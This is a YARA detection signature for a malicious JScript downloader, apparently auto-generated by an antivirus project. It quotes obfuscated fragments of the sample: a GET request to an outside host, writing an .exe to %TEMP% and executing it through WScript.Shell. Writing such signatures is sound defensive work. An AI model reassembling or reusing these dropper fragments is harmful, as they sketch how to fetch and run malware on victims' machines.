rule sig_20160328_f88426df840f6450823171976d0885ff {
  meta:
    description = "datamaliciousorder - file 20160328_f88426df840f6450823171976d0885ff.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4b5a57401a4851a6ab939539f7ef25a3a82b122d25d7231a62fdd55306674496"

  strings:
    $s1  = "function Hethnve() {return Lbfztjflx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"bETdt8RV3ootvPiM.exe\";};" fullword ascii
    $s2  = "do {WScript[Wmrygwc](Fjohbljk() * 11)} while (Jvdiqzu[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Fchur(Ahlui, Apximewt){return Ahlui - Apximewt;};" fullword ascii
    $s4  = "Jvdiqzu[Plimg](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s5  = "var Lbfztjflx = function Rujufic() {return WScript[Ximgcnumdp](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Jsualyv() {return ((Iyvijqqngl == true) && (Iyvijqqngl == Ioqawgejm)) ? 1 : Qwmcq;};" fullword ascii
    $s7  = "function Zoewhkb(Erhsed){Lbfztjflx[\"Run\"](Erhsed, Qwmcq, Qwmcq);};" fullword ascii
    $s8  = "Iyvijqqngl = true; " fullword ascii
    $s9  = "var Iyvijqqngl = false;" fullword ascii
    $s10 = "function Hnmtmm(){return Ximgcnumdp;};" fullword ascii
    $s11 = "function Vjbcnrtmn(){return Sykcx;};" fullword ascii
    $s12 = "var Ioqawgejm = false;" fullword ascii
    $s13 = "return Fchur(Ifusopf, Opgzwi);" fullword ascii
    $s14 = "var Stlcrf = false;" fullword ascii
    $s15 = "function Fjohbljk(){return 22;};" fullword ascii
    $s16 = " while (Ixeirff){" fullword ascii
    $s17 = "var Obyzmo = new this[\"Date\"]();" fullword ascii
    $s18 = "function Ojgyiwh(Yaccig) {var Xqvbqz = (1, 2, 3, 4, 5, Yaccig); return Xqvbqz;};" fullword ascii
    $s19 = "function Rynuzmnbip()" fullword ascii
    $s20 = "Ioqawgejm = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}